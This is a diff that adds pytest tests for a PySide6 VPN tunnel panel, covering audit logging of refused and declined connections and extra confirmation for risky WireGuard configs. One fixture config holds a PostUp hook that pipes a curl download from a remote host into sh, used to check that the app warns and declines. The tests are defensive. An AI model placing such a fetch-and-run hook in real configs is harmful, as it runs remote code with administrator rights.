@@ -2926,6 +2926,120 @@ class TestTunnelPanel:
         tunnel.connect_vpn()
         assert FakeVpnConnectionWorker.instances == []
 
+    # ── Every attempt is audited, refused and declined ones included ──────
+
+    @staticmethod
+    def _audit_to(monkeypatch, tmp_path):
+        import json
+        from services import vpn_execution
+        path = tmp_path / "tunnel_audit.jsonl"
+        monkeypatch.setattr(vpn_execution, "default_audit_path", lambda: path)
+        return lambda: [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []
+
+    def test_a_template_refusal_is_audited(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "information", staticmethod(lambda *a, **k: None))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Example — Japan", {
+            "name": "Example — Japan", "protocol": "WireGuard",
+            "endpoint": "<SERVER_IP>", "interface": "wgjp", "placeholder": True})
+        tunnel.connect_vpn()
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["action"] == "connect" and entry["outcome"] == "refused"
+        assert entry["profile"] == "Example — Japan"
+        assert "emplate" in entry["error"]
+
+    def test_a_blocked_review_is_audited_with_its_blockers(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available",
+                            lambda: False)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        (entry,) = entries()
+        assert entry["outcome"] == "refused"
+        assert entry["blockers"] and any("wg-quick" in b for b in entry["blockers"])
+        assert entry["interface"] == "wg0" and entry["protocol"] == "WireGuard"
+
+    def test_a_declined_confirmation_is_audited_as_declined(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        tunnel.disconnect_vpn()
+        assert FakeVpnConnectionWorker.instances == []
+        assert [(e["action"], e["outcome"]) for e in entries()] == [
+            ("connect", "declined"), ("disconnect", "declined")]
+        assert "declined" in tunnel.connection_status_label.text()
+
+    def test_an_accepted_confirmation_writes_no_refusal_entry(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        assert len(FakeVpnConnectionWorker.instances) == 1
+        assert entries() == []          # execute() audits the real attempt itself
+
+    def test_a_config_with_root_hooks_needs_a_second_confirmation(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        conf = tmp_path / "wgh.conf"
+        conf.write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            "PostUp = curl -s http://203.0.113.9/x | sh\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+        prompts = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: prompts.append(("question", a[1], a[-1])) or QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "warning",
+                            staticmethod(lambda *a, **k: prompts.append(("warning", a[1], a[-1])) or QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Hooked", {
+            "name": "Hooked", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+            "interface": "wgh", "config_path": str(conf)})
+        tunnel.connect_vpn()
+        # First prompt accepted, second (the hook warning, default No) declined.
+        assert [kind for kind, _, _ in prompts] == ["question", "warning"]
+        assert prompts[1][1].startswith("This config runs commands as administrator")
+        assert prompts[1][2] == QMessageBox.No
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["outcome"] == "declined"
+        assert any("as administrator" in w for w in entry["warnings"])
+
+    def test_a_config_without_hooks_asks_once(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        prompts = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: prompts.append("q") or QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "warning",
+                            staticmethod(lambda *a, **k: prompts.append("w") or QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        assert prompts == ["q"]
+        assert len(FakeVpnConnectionWorker.instances) == 1
+
     def test_a_successful_connect_updates_status(self, tunnel):
         tunnel._on_connection_finished({"success": True, "protocol": "WireGuard", "output": "up"})
         assert "WireGuard" in tunnel.connection_status_label.text()
@@ -2962,6 +3076,33 @@ class TestTunnelPanel:
             "endpoint": "<SERVER_IP>", "interface": "wgjp", "placeholder": True})
         tunnel.arm_kill_switch()
         assert FakeVpnConnectionWorker.instances == []
+
+    def test_the_arm_dialog_defaults_to_no_and_names_rules_and_recovery(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(vpn_connection, "killswitch_supported", lambda: True)
+        monkeypatch.setattr(vpn_connection, "killswitch_recovery_command",
+                            lambda: "sudo pfctl -a sentinel -F all")
+        asked = []
+
+        def question(parent, title, text, buttons, default=None):
+            asked.append((text, default))
+            return QMessageBox.No
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(question))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0", "port": 51820})
+        tunnel.arm_kill_switch()
+        (text, default), = asked
+        assert default == QMessageBox.No
+        assert "UDP/51820" in text and "203.0.113.7" in text
+        assert "sudo pfctl -a sentinel -F all" in text
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["action"] == "killswitch-arm" and entry["outcome"] == "declined"
+        assert "declined" in tunnel.kill_switch_status_label.text()
 
     def test_kill_switch_result_updates_its_own_status(self, tunnel):
         tunnel._on_killswitch_finished({"success": True, "output": "Kill switch ARMED"})
